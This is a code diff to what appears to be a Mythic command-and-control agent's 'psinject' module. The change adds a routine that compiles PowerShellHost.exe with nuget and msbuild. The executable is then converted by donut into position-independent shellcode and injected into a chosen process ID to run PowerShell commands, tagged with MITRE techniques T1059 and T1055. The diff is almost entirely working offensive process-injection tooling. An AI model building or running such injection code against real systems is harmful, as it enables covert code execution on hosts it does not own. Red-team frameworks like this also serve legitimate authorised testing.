@@ -1,11 +1,17 @@
+from distutils.dir_util import copy_tree
+import shutil
+import tempfile
 from mythic_payloadtype_container.MythicCommandBase import *
 import json
+from agent_functions.powerpick import POWERSHELL_HOST_PATH
 from sRDI import ShellcodeRDI
 from uuid import uuid4
 from mythic_payloadtype_container.MythicRPC import *
 from os import path
 import base64
 import donut
+
+POWERSHELL_HOST_PATH="/srv/PowerShellHost.exe"
 
 class PsInjectArguments(TaskArguments):
 
@@ -59,9 +65,27 @@ class PsInjectCommand(CommandBase):
     argument_class = PsInjectArguments
     attackmapping = ["T1059", "T1055"]
 
+    async def build_powershell(self):
+        global POWERSHELL_HOST_PATH
+        agent_build_path = tempfile.TemporaryDirectory()
+        outputPath = "{}/PowerShellHost/bin/Release/PowerShellHost.exe".format(agent_build_path.name)
+            # shutil to copy payload files over
+        copy_tree(self.agent_code_path, agent_build_path.name)
+        shell_cmd = "rm -rf packages/*; nuget restore -NoCache -Force; msbuild -p:Configuration=Release {}/PowerShellHost/PowerShellHost.csproj".format(agent_build_path.name)
+        proc = await asyncio.create_subprocess_shell(shell_cmd, stdout=asyncio.subprocess.PIPE,
+                                                         stderr=asyncio.subprocess.PIPE, cwd=agent_build_path.name)
+        stdout, stderr = await proc.communicate()
+        if not path.exists(outputPath):
+            raise Exception("Failed to build PowerShellHost.exe:\n{}".format(stderr.decode()))
+        shutil.copy(outputPath, POWERSHELL_HOST_PATH)
+
+
     async def create_tasking(self, task: MythicTask) -> MythicTask:
-        exePath = "/srv/PowerShellHost.exe"
-        donutPic = donut.create(file=exePath, params=task.args.get_arg("pipe_name"))
+        global POWERSHELL_HOST_PATH 
+        if not path.exists(POWERSHELL_HOST_PATH):
+            await self.build_powershell()
+
+        donutPic = donut.create(file=POWERSHELL_HOST_PATH, params=task.args.get_arg("pipe_name"))
         file_resp = await MythicRPC().execute("create_file",
                                               task_id=task.id,
                                               file=base64.b64encode(donutPic).decode(),
@@ -69,7 +93,7 @@ class PsInjectCommand(CommandBase):
         if file_resp.status == MythicStatus.Success:
             task.args.add_arg("loader_stub_id", file_resp.response['agent_file_id'])
         else:
-            raise Exception("Failed to register execute-assembly DLL: " + file_resp.error)
+            raise Exception("Failed to register PowerShellHost.exe: " + file_resp.error)
         task.display_params = "-PID {} -Command {}".format(task.args.get_arg("pid"), task.args.get_arg("powershell_params"))
         return task
 
